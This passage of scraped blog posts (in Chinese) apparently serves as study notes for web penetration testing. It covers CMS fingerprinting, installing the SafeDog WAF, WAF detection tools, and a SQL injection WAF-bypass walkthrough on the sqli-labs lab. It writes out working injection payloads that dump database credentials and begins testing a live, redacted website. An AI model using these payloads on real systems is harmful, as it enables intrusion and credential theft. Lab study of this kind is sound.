如果喜欢我的文章欢迎各位大佬点击右下角的订阅图标开启浏览器推送吧，这样你只要不清除浏览器缓存就能第一时间收到我的更新通知啦（如果你的网络如果能上Google就用Chrome浏览器订阅，如果不能推荐用微软的Edge浏览器，目前正在寻找解决办法，订阅成功后会有一条提示成功，如果未收到表示网络限制原因未订阅成功） 中华人民共和国网络安全法(2017年6月1日起施行) 第二十二条任何个人和组织不得从事入侵他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动;不得提供从事入侵网络、干扰网络正常功能、窃取网络数据等危害网络安全活动的工具和制作方法;不得为他人实施危害网络安全的活动提供技术支持、广告、推广、支付结算等帮助。 第三十八条任何个人和组织不得窃取或者以其他非法方式获取公民个人信息,不得出售或者非法向他人提供公民个人信息 第六十三条违反本法规定,给他人造成损害的,依法承担民事责任 第六十四条违反本法规定,构成犯罪的,依法追究刑事责任 中华人民共和国刑法(285286) 第二百八十五条违反国家规定,侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的处三年以下有期徒刑或者拘役 第二百八十六条违反国家规定,对计算机信息系统功能进行删除、修改、增加、干扰,造成计算机信息系统不能正常运行,后果严重的,处五年以下有期徒刑或者拘役:后果特别严重的,处五年以上有期徒刑。违反国家规定,对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作,后果严重的,依照前款的规定处罚 中华人民共和国刑法修正案7(第九条) 在刑法第二百八十五条中增加两款作为第二款、第三款:“违反国家规定,侵入前款规定以外的计算机信息系统或者采用其他技术手段,获取该计算机信息系统中存储、处理或者传输的数据,或者对该计算机信息系统实施非法控制,情节严重的,处三年以下有期徒刑或者拘役,并处或者单处罚金:情节特别严重的,处三年以上七年以下有期徒刑,并处罚金提供专门用于侵入、非法控制计算机信息系统的程序、或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具,情节严依照前款的规定处罚。 CMS定义 CMS是英语 Content Management System 的缩写,按英语的字面翻译就是内容管理系统,它主要是为了方便发布网络内容而存在的一体化Web管理系统 cms一般的安全测试流程 判断cms类型 根据类型,搜索已知的漏洞丨或综合搜索 漏洞利用 提权等。。。 常见CMS系统织梦CMS 官网: http://www.dedecms.com 用途: seo 文章站,图片站等等 关键字: powered by dedecms 概述（版本可能较老）: 前端使用 html/css/javascript 等语言成语编写，后台基于 PHP5/PHP7 程序编写，服务器运行环境 Nginx/IIS/Apache 数据库采用的是 MySQL4/5 或 SQLite 帝国CMS 官网:http://www.phome.net用途:下截系统、音乐系统、商城系统、产品库等等关键字: powered by dedecms 概述: 《帝国网站管理系统》英文译为\"Empire CMS\"，简称 \"Ecms\"，它是基于B/S结构，且功能强大而帝国CMS-logo易用的网站管理系统。本系统由帝国开发工作组独立开发，是一个经过完善设计的适用于Linux/windows引/Unix等环境下高效的网站解决方案。从帝国新闻系统1.0版至今天的帝国网站管理系统，它的功能进行了数次飞跃性的革新，使得网站的架设与管理变得极其轻松！ discuz 官网:https://www.discuz.net/#用途:主要用于论坛等等关键字: powered by discuz 概述: Discuz 是康盛创想(Comsenz)科技有限公司用PHP语言开发的一套通用的社区论坛软件系统，就像WordPress一样，有专门开发Discuz!的主题、插件的工作室。目前Discuz!主要用来做地方门户网站、产品官方网站、企业官网等多功能CMS PHPcms 官网:http://www.phpcms.info用途:可用作主页等关键字: powered by phpcms 概述: Phpcms 是国内领先的网站内容管理系统，同时也是一个开源的PHP开发框架。PHPCMS V9（简称V9）采用PHP5+MYSQL做为技术基础进行开发。V9采用OOP（面向对象）方式进行基础运行框架搭建。 ECShop 官网:https://www.ecshop.com 用途:一般用于网点等 关键字: powered by ecshop 概述: ECShop 没有用框架，是面向过程了，中间使用了 smarty 模板引擎技术 ECShop 是一款 B2C 独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于 PHP 语言及 MYSQL 数据库构架开发的跨平台开源程序。Smarty 是 PHP 的”半官方”的模板化引擎，从其主页的位置就可以看出。Smarty 的作者是 Andrei Zmievski 和 Monte Orte。它是在 GNU 宽通用公共许可（LGPL）下发布的，可能是最流行、功能最强大的 PHP 模板化引擎。 XYcms 官网:http://www.jsxyidc.com 用途:招聘宣传、公司网站页面展示等 关键字: powered by xycms 概述: XYCMS 是南京 XYCMS 企业建站系统的简称，该建站系统是一款基于 ASP 开发的商业性建站系统，网站系统方便、简洁、容易上手。所设计的版本分为动态版和静态版。布局采用当今最流行 DIV+CSS 构架，对各大浏览器兼容性好，代码执行效率显著优于 table 建站。 Wordpress 官网:https://cn.wordpress.org 用途:建博客等等 关键字: powered by wordpress 概述: WordPress 是一个以 PHP 和 MySQL 为平台的自由开源的博客软件和内容管理系统。WordPress 具有插件架构和模板系统。Alexa 排行前100万的网站中有超过16.7%的网站使用 WordPress。到了2011年8月，约22%的新网站采用了 WordPress。WordPress 是目前因特网上最流行的博客系统。 扫描工具: wpscan 是一款专门针对 WordPress 漏洞扫描的工具 总结 PHP类: dedecms、帝国cms、 ecshop、 phpcms、 cmstop、 discuz、 phpwind等ASP类: zblog、 KingCMS、 XYcms、易动、南方等.net类: EoyooCMS 等国外的著名cms系统: joomla、 WordPress 安全测试思维导图安全测试大体流程图 安全测试大体流程 怎么做 获取授权 明确资产和待测信息 明确需求 web漏洞 app漏洞 逆向 接口分析 流量分析 主机漏洞 流量分析 渗透测试 主机扫描 免杀 信息搜集 主动扫描 搜索引擎搜集 基础信息：ip、端口、端口应用 操作系统信息 人员信息 社工库 网上公开漏洞 poc 或 exp 适量的漏洞扫描工具辅助 awvs 注意10.0版本的反制 appscan 注意版本的反制 BurpSuite Xray goby 御剑珍藏版 漏洞验证 自动化验证 Xray 手动验证 逻辑漏洞 越权漏洞 人员弱口令漏洞 信息整理分析 验证 poc 或 exp 等 struts2 shiro 收集的信息整理 脆弱点分析 安全测试报告撰写 从信息收集到信息整理分析步骤的完整过程 漏洞的危害性描述 修复建议 复测 原来的漏洞是否修复 是否因修复暴露出新的问题 怎么学 web安全测试基础 信息收集脑图 渗透的本质就是信息收集 CMS渗透信息收集 操作系统 端口号 运行软件版本信息 通过 CVE 漏洞等使用 msf 攻击等 其它 CMS 旁站攻击 逻辑漏洞 任意用户注册 密码修改 验证码 短信验证码 图片验证码 未授权访问 超时退出 价格校验 垂直越权 水平越权 信息搜集 网站真实IP nslookup查询 超级ping 邮件报错信息 海外服务 ioc文件 hash 值计算比较 网站语言获取 ASP PHP JSP ASPX 数据库 ASP+ACCESS 可注入获取信息 ASPX+MYSQL 可注入获取信息 获取权限 PHP+MYSQL 可注入获取信息 获取权限 JAVA+ORACLE 可注入获取信息 获取权限 端口 nmap端口扫描 msscan端口扫描 在线端口扫描 FoFa Shodan CMS类型判断 Powered by 判断 专业的 cms 指纹识别类型或插件 网站代码判断 泄露路径或敏感路径 Robots.txt 文件报错信息 专业插件信息收集 FOFA Shodan Wappalyzer 路径扫描工具 御剑目录扫描器 Dirsearch 后台 御剑目录扫描器 Dirsearch 百度或 Google 语法 根据经验判断 中间件 Weblogic 常见漏洞 Tomcat 常见漏洞 Nginx 常见漏洞 JBOSS 常见漏洞 ISS 系列 APACHE web漏洞 SQL 注入 XSS 命令执行 CSRF 上传 类型判断根据 power by进行判断 查看网页源代码通过搜索 Powered by 例子: Powered by Discuz 通过专业的cms指纹识别类型或插件进行判 识别的工具插件多种多样，识别的准确率也各有千秋，在实际运用中我们要结合使用 尽可能多的获取信息 识别国内网站 产品名称 访问地址 说明 云悉 https://www.yunsee.cn 需要注册登录账号，需要收费或者提交插件 潮汐指纹 http://finger.tidesec.net 需要注册登录后使用 who am i http://whatweb.bugscaner.com 在线识别网站无需注册登录，系统有点老 识别国外网站 产品名称 访问地址 说明 whatcms https://whatcms.org 无 cmsdetect https://cmsdetect.com 无 itrack https://itrack.ru/whatcms 俄罗斯的产品 综合搜索通过cms类型搜索已知漏洞 百度搜索 google搜索 源代码审计 微信搜一搜搜索 FOFA 信息搜集 可通过插件或 FOFA官网 进行搜索,然后将搜集到的信息找对应开源系统版本的漏洞 架构漏洞 接口、目录扫描等 Shodan 信息搜集 可通过插件或 Shodan官网 进行搜索,然后将搜集到的信息找对应开源系统版本的漏洞 架构漏洞 接口、目录扫描等 Wappalyzer 信息搜集 可通过插件或 Wappalyzer官网 进行搜索,然后将搜集到的信息找对应开源系统版本的漏洞 架构漏洞 接口、目录扫描等 主动收集旁站旁站查询 产品名称 访问地址 说明 WebScan https://www.webscan.cc / 查旁站 https://chapangzhan.com / 旁站攻击 旁站攻击：当我们想获取一个不太好进入的管理系统时，可以利用和该系统在同一台服务器上的其它程序 通过旁敲侧击的方式，一波三折最后进入我们的目的地 目录扫描 序号 产品名称 说明 1 御剑扫描工具 windows工具 2 dirsearch 跨平台 搜索引擎 序号 产品名称 说明 1 google hacking 谷歌语法，全球最大的搜索引擎 2 baidu 最大的中文搜索引擎，搜中文娱乐新闻、下盗版软件视频首选百度 来之网络传说 3 bing bing属于微软产品 在超冷门的领域搜索效果不如google，但是比百度少太多广告了 4 sougou / 5 360 / 1.搜索引擎都是分解关键词进行查询，但百度会找关键词的近义词 ，一同进行查询，比如“方法”，百度会同时查询“小窍门”，“小妙招”等。 2.在百度，360上知乎权重较低，Google和bing上知乎权重较高。 3.在百度，Google，Bing上找不到“360问答”，360上找不到“百度知道”，Google和Bing能找到“百度知道”。 4.百度搜索的内容主要以国内的回答为主，近义词联想很不错，Google，Bing国内外的回答都能搜到 ，360….放弃吧 5.sougou不太熟悉，输入法倒是常用一分钟能打100 200个字问题不大 安全测试利用搜索的漏洞进行测试 本地搭建,环境复现测试 适量的漏洞扫描 xray+bp进行辅助测试 其他 抓包,尝试测试越权、上传等","categories":[{"name":"Security","slug":"Security","permalink":"https://www.adalucky.com/categories/Security/"}],"tags":[{"name":"测试流程","slug":"测试流程","permalink":"https://www.adalucky.com/tags/%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/"},{"name":"cms","slug":"cms","permalink":"https://www.adalucky.com/tags/cms/"},{"name":"信息搜集脑图","slug":"信息搜集脑图","permalink":"https://www.adalucky.com/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E8%84%91%E5%9B%BE/"}],"author":"Ada"},{"title":"网站安全狗4.0","slug":"Security/安全狗安装","date":"2021-08-05T11:21:47.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/security/an-quan-gou-an-zhuang/","link":"","permalink":"https://www.adalucky.com/security/an-quan-gou-an-zhuang/","excerpt":"服务器的安全关乎网站的运行和数据库的安全，因此在对服务器防护是每位站长需要考虑的事情，现今的安全防护软件有很多，其中有一款比较著名的软件就是安全狗，今天就让我们来一起看看安全狗如果进行安装。","text":"服务器的安全关乎网站的运行和数据库的安全，因此在对服务器防护是每位站长需要考虑的事情，现今的安全防护软件有很多，其中有一款比较著名的软件就是安全狗，今天就让我们来一起看看安全狗如果进行安装。 前置申明 本博客所有内容均为作者的个人学习笔记记录，作者也是小白一枚，如果有什么地方写的不对或者对您带来影响欢迎底部留言或者点击右下角的图标与我联系吧 本博客的所有 Security 大类下的文章只能作为学习研究使用，不可用于非法测试和攻击，请遵循网络安全法，共筑和谐网络 如果喜欢我的文章欢迎各位大佬点击右下角的订阅图标开启浏览器推送吧，这样你只要不清除浏览器缓存就能第一时间收到我的更新通知啦（如果你的网络如果能上Google就用Chrome浏览器订阅，如果不能推荐用微软的Edge浏览器，目前正在寻找解决办法，订阅成功后会有一条提示成功，如果未收到表示网络限制原因未订阅成功） 中华人民共和国网络安全法(2017年6月1日起施行) 第二十二条任何个人和组织不得从事入侵他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动;不得提供从事入侵网络、干扰网络正常功能、窃取网络数据等危害网络安全活动的工具和制作方法;不得为他人实施危害网络安全的活动提供技术支持、广告、推广、支付结算等帮助。 第三十八条任何个人和组织不得窃取或者以其他非法方式获取公民个人信息,不得出售或者非法向他人提供公民个人信息 第六十三条违反本法规定,给他人造成损害的,依法承担民事责任 第六十四条违反本法规定,构成犯罪的,依法追究刑事责任 中华人民共和国刑法(285286) 第二百八十五条违反国家规定,侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的处三年以下有期徒刑或者拘役 第二百八十六条违反国家规定,对计算机信息系统功能进行删除、修改、增加、干扰,造成计算机信息系统不能正常运行,后果严重的,处五年以下有期徒刑或者拘役:后果特别严重的,处五年以上有期徒刑。违反国家规定,对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作,后果严重的,依照前款的规定处罚 中华人民共和国刑法修正案7(第九条) 在刑法第二百八十五条中增加两款作为第二款、第三款:“违反国家规定,侵入前款规定以外的计算机信息系统或者采用其他技术手段,获取该计算机信息系统中存储、处理或者传输的数据,或者对该计算机信息系统实施非法控制,情节严重的,处三年以下有期徒刑或者拘役,并处或者单处罚金:情节特别严重的,处三年以上七年以下有期徒刑,并处罚金提供专门用于侵入、非法控制计算机信息系统的程序、或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具,情节严依照前款的规定处罚。 介绍 安全狗的三大核心功能 包括 服务器安全狗 网站安全狗 基于云端的监控和保护功能 安全狗面向服务器的功能主要有服务器优化、网络防火墙（DDOS、ARP、Web（CC）防火墙、3层防护层层过滤等）、主动防御、邮件 警告、防护日志软件管家等功能。网站安全狗包括网马查杀、主动防御（SQL注入防护、网马防护、危险组件防护、禁止IIS执行程序，全方位一体防护，保护 网站免受注入、网马、危险组件、恶意程序执行等一系列网站攻击危害）、流量保护（CC攻击防护、多线程下载流量控制）、资源保护、网站监控、IP黑白名单 和.NET设置等功能。还有服云PC客户端，能够让用户在本地电脑上轻松打理千里之外的服务，十分方便。 完美的兼容性 安全狗具有完美的兼容性，除了能够支持全系列的Windows服务器操作系统，还推出了服务器安全狗Linux，同时具有较高的稳定性、资源占用率低并且 高效，防御能力超强，能有效防御功能范围内的各类型攻击。可操作性强，页面简单，功能设置简便。是保证网站和服务器安全的好帮手。服务器安全狗和网站安全狗为IDC运营商、虚拟主机服务商、企业主机、服务器管理者等用户提供服务器安全防范的实用系统。同时安全狗团队正在不断发展系列产品，现已形成涵盖服务器安全以及网站安全领域的诸多成熟产品，逐渐占据了全国同类市场。安全狗是一款值得广大站长们信赖的软件，能够有效保证网站和服务器的安全。 下载安装下载 下载地址：http://free.safedog.cn/website_safedog.html 注：4.0版本使用时候需要进行注册账号 如果不想注册那么只有进行3.5版本的下载体验 安装安全狗 windows版本官方手册：http://down.safedog.cn/download/software/safedogwz_Windows_Help.pdf 安装Apache2.4 因为我们下载的是Apache版本的网站安全狗 因此需要Apache服务，但是phpStudy里面的那个启动了以后在任务管理器中是找不到对应的服务的 Apache 将phpstudy修改为系统服务 phpStudy 系统服务的意思是每次电脑关机重启后，phpStudy会自动重启 安装安全狗4.0 4.0版本的就需要进行注册账户了，如果觉得麻烦可以进行安装3.5版本 注意打开程序的时候要有提示 插件已安装，如图的第5步，否则可能会出现不生效等问题 校验http://192.168.151.5/sqli/Less-25/?id=1' union select 1,2,3 --+","categories":[{"name":"Security","slug":"Security","permalink":"https://www.adalucky.com/categories/Security/"}],"tags":[{"name":"安全狗","slug":"安全狗","permalink":"https://www.adalucky.com/tags/%E5%AE%89%E5%85%A8%E7%8B%97/"},{"name":"safedogwzApache","slug":"safedogwzApache","permalink":"https://www.adalucky.com/tags/safedogwzApache/"}],"author":"Ada"},{"title":"waf识别","slug":"Security/waf识别","date":"2021-08-04T11:55:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/security/waf-shi-bie/","link":"","permalink":"https://www.adalucky.com/security/waf-shi-bie/","excerpt":"Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称：WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。","text":"Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称：WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。 前置申明 本博客所有内容均为作者的个人学习笔记记录，作者也是小白一枚，如果有什么地方写的不对或者对您带来影响欢迎底部留言或者点击右下角的图标与我联系吧 本博客的所有 Security 大类下的文章只能作为学习研究使用，不可用于非法测试和攻击，请遵循网络安全法，共筑和谐网络 如果喜欢我的文章欢迎各位大佬点击右下角的订阅图标开启浏览器推送吧，这样你只要不清除浏览器缓存就能第一时间收到我的更新通知啦（如果你的网络如果能上Google就用Chrome浏览器订阅，如果不能推荐用微软的Edge浏览器，目前正在寻找解决办法，订阅成功后会有一条提示成功，如果未收到表示网络限制原因未订阅成功） 中华人民共和国网络安全法(2017年6月1日起施行) 第二十二条任何个人和组织不得从事入侵他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动;不得提供从事入侵网络、干扰网络正常功能、窃取网络数据等危害网络安全活动的工具和制作方法;不得为他人实施危害网络安全的活动提供技术支持、广告、推广、支付结算等帮助。 第三十八条任何个人和组织不得窃取或者以其他非法方式获取公民个人信息,不得出售或者非法向他人提供公民个人信息 第六十三条违反本法规定,给他人造成损害的,依法承担民事责任 第六十四条违反本法规定,构成犯罪的,依法追究刑事责任 中华人民共和国刑法(285286) 第二百八十五条违反国家规定,侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的处三年以下有期徒刑或者拘役 第二百八十六条违反国家规定,对计算机信息系统功能进行删除、修改、增加、干扰,造成计算机信息系统不能正常运行,后果严重的,处五年以下有期徒刑或者拘役:后果特别严重的,处五年以上有期徒刑。违反国家规定,对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作,后果严重的,依照前款的规定处罚 中华人民共和国刑法修正案7(第九条) 在刑法第二百八十五条中增加两款作为第二款、第三款:“违反国家规定,侵入前款规定以外的计算机信息系统或者采用其他技术手段,获取该计算机信息系统中存储、处理或者传输的数据,或者对该计算机信息系统实施非法控制,情节严重的,处三年以下有期徒刑或者拘役,并处或者单处罚金:情节特别严重的,处三年以上七年以下有期徒刑,并处罚金提供专门用于侵入、非法控制计算机信息系统的程序、或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具,情节严依照前款的规定处罚。 介绍 Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。 waf的工作原理 waf的分类云waf代表 百度安全宝、阿里云盾、长亭雷池 硬件waf 绿盟、深信服 软件waf 安全狗、D盾 代码级waf 自己写的waf规则,防止出现注入等 常见的waf进程和服务 Windows系统下可通过 tasklist 查看当前启动的进程服务有哪些（映像名称） D盾 服务名:d_safe 进程名:D_ Safe Manage.exe、d_ manage.exe 云锁 服务端监听端口:5555 服务名: Yun SubAgent/ jtAgent(云锁 windows平台代理服务)、 Yun SuoDaemon/ JtDaemon(云锁 Windows平台守护服务) 阿里云盾 服务名: Alibaba Security Aegis Detect Service、 Alibaba Security Aegis Update Service、 AliyunService 进程名: ALlYunDu 腾讯云安全 进程名: BaradAgent.exe、 sgagent.exe、 YDService.exe、 YDLive.exe、 YDEdr.exe 360主机卫士 服务名: QHWafUpdata 进程名:360 WebSafe.exe、 OHSrv.exe、 QHWebshellGuard.exe 网站/服务器安全狗 服务名: SafeDog CloudE per、 Safedog Update Center、 SafeDog GuardCenter(服务器安全狗守护中心) 进程名: SafeDogSiteApache.exe SafeDogGuardCenter.exe safedogupdatecenter.exe safedogguardcenter.exe SafeDogSiteIIS.exe SafeDogTray.exe SafeDogServerUI.exe 护卫神·入侵防护系统 服务名:hws、hwsd、 HwsHostEx/ HwsHostwebEx(护卫神主机大师服务)进程名: HwsPanel.exe（状态托盘） hws_ui.exe hws.exe(服务处理程序) hwsd.exe (监控组件) 网防G01政府网站综合防护系统(“云锁”升级版) 服务器监听端口：5555 服务名：Yun SubAgent、 Yun SuoDaemon(不知是否忘了替换了!) 进程名: gov_ defence_service.exe、 gov_defence UPUPW 宝塔 linux下的集成化环境 端口 888/8888 智创防火墙 西数WTS-WAF 示例：id=10086 UNION SELECT 1,2,3 FROM table_name 突破：将所有的空格换成+号 id=10086+UNION+SELECT+1,2,3+FROM+table_name Naxsi WAF 腾讯云 腾讯宙斯盾 百度云 华为云 更多waf 太多了 其实也就是混个眼熟，这里不展开写了，有很多很好的文章 参考链接：https://blog.csdn.net/zhangge3663/article/details/110945853 waf识别工具原理 识别WAF,可以在WAF指纹目录下自行编写脚本。这类WAF识别工具的原理基本都是根据HTTP头部信息、状态码以及WAF拦截页中的图片、文字做为特征来进行检测, waf识别工具wafw00f waf识别工具:wafw00f 下载链接:https://github.com/enableSecurity/wafw00f pip3下安装#需要电脑有对应的环境，当前演示的为 Mac 系统 pip3 -V #安装 pip3 install wafw00f #验证 wafw00f 练习 通过wafw00f去识别目标得知的waf设备类型 图标 2 4 表示识别的次数 #测试 wafw00f http://www.xxx.com/view_detail.asp\\?id\\=78 wafw00f http://115.xxx.xxx.xxx/sqli-labs-master/less-1/\\?id\\=1 identYwaf 下载地址：https://github.com/stamparm/identywaf identYwaf下载#git 下载 identYwaf 我这边两种方式都无法下载 所以直接下载的zip包解压 git clone https://github.com/stamparm/identYwaf.git git clone --depth 1 https://github.com/stamparm/identYwaf.git 安装校验#进入目录 cd /Users/ada/software/tools/identYwaf #校验 python3 identYwaf.py 练习#进入目录 cd /Users/ada/software/tools/identYwaf #练习监测waf python3 identYwaf.py http://www.xxx.com/view_detail.asp\\?id\\=78 python3 identYwaf.py sqli.test/sqli-labs-master/less-1/\\?id\\=1 ![identYwaf 练习1](/Users/ada/Library/Application Support/typora-user-images/image-20210804234310566.png) sqlmap#老版本支持 -u 后面换成自己的注入ip+语句 我的是 1.5.5#stable 已经废弃了 1.4.9#stable 版本是支持的 sqlmap -u sqli.test/sqli-labs-master/less-1/\\?id\\=1 --identify-waf","categories":[{"name":"Security","slug":"Security","permalink":"https://www.adalucky.com/categories/Security/"}],"tags":[{"name":"waf","slug":"waf","permalink":"https://www.adalucky.com/tags/waf/"},{"name":"wafw00f","slug":"wafw00f","permalink":"https://www.adalucky.com/tags/wafw00f/"},{"name":"identYwaf","slug":"identYwaf","permalink":"https://www.adalucky.com/tags/identYwaf/"}],"author":"Ada"},{"title":"sql注入绕过waf","slug":"Security/sql注入绕过waf","date":"2021-08-04T11:55:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/security/sql-zhu-ru-rao-guo-waf/","link":"","permalink":"https://www.adalucky.com/security/sql-zhu-ru-rao-guo-waf/","excerpt":"SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。","text":"SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 前置申明 本博客所有内容均为作者的个人学习笔记记录，作者也是小白一枚，如果有什么地方写的不对或者对您带来影响欢迎底部留言或者点击右下角的图标与我联系吧 本博客的所有 Security 大类下的文章只能作为学习研究使用，不可用于非法测试和攻击，请遵循网络安全法，共筑和谐网络 如果喜欢我的文章欢迎各位大佬点击右下角的订阅图标开启浏览器推送吧，这样你只要不清除浏览器缓存就能第一时间收到我的更新通知啦（如果你的网络如果能上Google就用Chrome浏览器订阅，如果不能推荐用微软的Edge浏览器，目前正在寻找解决办法，订阅成功后会有一条提示成功，如果未收到表示网络限制原因未订阅成功） 中华人民共和国网络安全法(2017年6月1日起施行) 第二十二条任何个人和组织不得从事入侵他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动;不得提供从事入侵网络、干扰网络正常功能、窃取网络数据等危害网络安全活动的工具和制作方法;不得为他人实施危害网络安全的活动提供技术支持、广告、推广、支付结算等帮助。 第三十八条任何个人和组织不得窃取或者以其他非法方式获取公民个人信息,不得出售或者非法向他人提供公民个人信息 第六十三条违反本法规定,给他人造成损害的,依法承担民事责任 第六十四条违反本法规定,构成犯罪的,依法追究刑事责任 中华人民共和国刑法(285286) 第二百八十五条违反国家规定,侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的处三年以下有期徒刑或者拘役 第二百八十六条违反国家规定,对计算机信息系统功能进行删除、修改、增加、干扰,造成计算机信息系统不能正常运行,后果严重的,处五年以下有期徒刑或者拘役:后果特别严重的,处五年以上有期徒刑。违反国家规定,对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作,后果严重的,依照前款的规定处罚 中华人民共和国刑法修正案7(第九条) 在刑法第二百八十五条中增加两款作为第二款、第三款:“违反国家规定,侵入前款规定以外的计算机信息系统或者采用其他技术手段,获取该计算机信息系统中存储、处理或者传输的数据,或者对该计算机信息系统实施非法控制,情节严重的,处三年以下有期徒刑或者拘役,并处或者单处罚金:情节特别严重的,处三年以上七年以下有期徒刑,并处罚金提供专门用于侵入、非法控制计算机信息系统的程序、或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具,情节严依照前款的规定处罚。 介绍分类 sql 注入大致分为3类分别为 白盒绕过 黑盒绕过 fuzz测试 前置准备 说明：此次练习的环境是基于 windows7 下用 phpStudy2018 搭建的 sqli-labs 靶场以 Less-25 关卡进行演示 重置sqli-labs数据库 我这边是因为之前做用工具对靶场进行了安全扫描 怕有一些干扰因此先重置一下防止出问题 如果是第一次部署sqli-labs 需要将 sqli\\sql-connections\\db-creds.inc 文件中的数据库密码进行配置 大概是在第五行 $dbpass ='你的数据库密码'; 重置数据库时候需要将 php 版本需要选择 5.2.17 调整php版本 在 sqli-labs 进行注入的时候,php版本需要选择5.4.45 如果低于这个版本会出现一些错误 也就是上面改成低版本这里又要改改回5.4.45了 输出 sql 语句 为了方便展示，我们需要在执行 sql 注入的时候查看一下我们的执行语句，因此在对应的关卡中加入输入 语法如下 如果是docker启动的 那么该文件在 /var/www/html/Less-25/index.php 修改前最好备份.bak echo $sql; echo\"&lt;br&gt;\"; 修改Less-1的请求方式 将Less-1 关卡中index.php 中默认的get请求替换为 RESUEST 这样可以同时支持 get 和 post 方便练习 mysql中的注释注释符-- 不带注释 SELECT * FROM users WHERE id = 1; #通过注释符号【#】号注释 SELECT * FROM users WHERE id = 2; -- 通过减减空格注释 SELECT * FROM users WHERE id = 3; 多行注释SELECT * FROM users WHERE id = 1; SELECT * FROM users /*这是mysql的多行注释只要注释体内就不会影响外面的*/WHERE id = 1; 特殊注释 其实这里我也有点蒙，看了一些资料说的是数字小于mysql的版本就会执行 但是这个第二条 51000 又没有执行出来 所以还是不要卡太死 这个是mysql的一个特性 根据版本号有关 SELECT /*!60000 DATABASE(),*/ VERSION(); SELECT /*!51000 DATABASE(),*/ VERSION(); SELECT /*!50000 DATABASE(),*/ VERSION(); SELECT /*!40000 DATABASE(),*/ VERSION(); mysql中的换行-- 用HackBar 进行测试的时候换行符号用 %0a 表示 select 1,2#ssssihhigiugiusgiug ,3; 练习白盒绕过 通过源代码分析,来进行绕过 例:less-25 当前用的腾讯云上 docker 安装的 sqli-labs 并未安装安全狗防护 执行 id=1-- 通过HackBar执行 显示正常 http://sqli:8200/Less-25/?id=1 执行 id=1’-- 此时报错,说明存在漏洞 http://sqli:8200/Less-25/?id=1' 执行id=1’ orderby 1 –+ 使用 order by 语句发现报错,无法使用，观察打印出来的原因是过滤了 or http://sqli:8200/Less-25/?id=1' orderby 1 --+ 尝试双写 oorrderby-- 返回正常，并且能判断有3列 http://sqli:8200/Less-25/?id=1 oorrderby 1 --+ 执行id=1’ and ‘1’=’1http://sqli:8200/Less-25/?id=1' and '1'='1 尝试双写 aandndhttp://sqli:8200/Less-25/?id=1' aandnd '1'='1 执行union select回显查看是否支持回显-- 5 6支持回显 http://sqli:8200/Less-25/?id=-1' union select 4,5,6 --+ union select 回显查询当前的库-- 查询当前的库 http://sqli:8200/Less-25/?id=-1' union select 4,5,database() --+ 查看所有的库 group_concat()拼接函数拼接括号里面的那个字段，查询所有的库把所有的结果拼接起来 infoorrmation 要双写因为上面测试发现 or 被过滤掉了 http://sqli:8200/Less-25/?id=-1' union select 4,5,group_concat(schema_name) from infoorrmation_schema.schemata --+ 查看security库下的表 通过上面database()我们已经知道了当前的库名为 security,那么可以对其查询下面的表有哪些 infoorrmation 要双写因为上面测试发现 or 被过滤掉了0x7365637572697479 为16进制编码后的security %23 为【- - +】url编码后的值 http://sqli:8200/Less-25/?id=-1' union select 4,5,group_concat(table_name) from infoorrmation_schema.tables where table_schema=0x7365637572697479 %23 查看users表有哪些字段 infoorrmation 和 aandnd 要双写因为上面测试发现 or and 都被过滤掉了 http://sqli:8200/Less-25/?id=-1' union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_schema='security' aandnd table_name='users' --+ 查看security.users表下 username,password 的值 查看security.users表下 username,password 的值 passwoorrd 要双写，要双写因为上面测试发现 or 被过滤掉了 0X23是 #号通过16进制编码后的结果 concat_ws函数是拼接字段的函数 http://sqli:8200/Less-25/?id=-1' union select 1,2,group_concat(concat_ws(0x23,username,passwoorrd)) from security.users --+ 线上环境练习查看是都存在漏洞-- 返回正常 http://www.xxx.com/view_detail.asp?id=91 -- 报错，说明存在注入 http://www.xxx.com/view_detail.asp?id=91' order by查看有多少列http://www.xxx.com/view_detail.asp?id=91 order by 6 http://www.xxx/view_detail.asp?id=91 order by 7 查看可回显的字段http://www.xxx.com/view_detail.asp?id=91 union select 